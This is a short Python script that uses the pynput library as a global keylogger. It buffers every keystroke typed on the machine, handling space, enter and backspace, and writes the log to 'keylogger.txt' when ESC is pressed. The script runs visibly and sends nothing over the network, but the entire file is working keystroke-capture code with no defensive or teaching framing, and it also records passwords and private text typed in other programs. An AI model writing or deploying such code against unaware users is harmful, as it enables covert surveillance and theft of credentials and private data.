from pynput import keyboard
import os

# Specify the path where you want to save the log file
log_file_path = 'keylogger.txt'  # Use a relative path for simplicity

# Ensure the log file path is correct and writable
if not os.path.exists(os.path.dirname(log_file_path)) and os.path.dirname(log_file_path) != '':
    os.makedirs(os.path.dirname(log_file_path))

# Buffer to hold the keystrokes
keystroke_buffer = []

def on_press(key):
    try:
        # Append the key pressed to the buffer
        keystroke_buffer.append(key.char)
    except AttributeError:
        # Append special keys with a description
        if key == keyboard.Key.space:
            keystroke_buffer.append(' ')
        elif key == keyboard.Key.enter:
            keystroke_buffer.append('\n')
        elif key == keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer.pop()  # Remove the last character on backspace
        else:
            keystroke_buffer.append(f'[{key}]')  # Special keys

def on_release(key):
    if key == keyboard.Key.esc:
        # Write the buffer content to the file and stop listener
        with open(log_file_path, 'a') as file:
            file.write(''.join(keystroke_buffer) + '\n')  # Ensure a new line is added
        print(f'Logged to file: {log_file_path}')  # Debugging line
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print('Keylogger started. Press ESC to stop.')  # Debugging line
    listener.join()
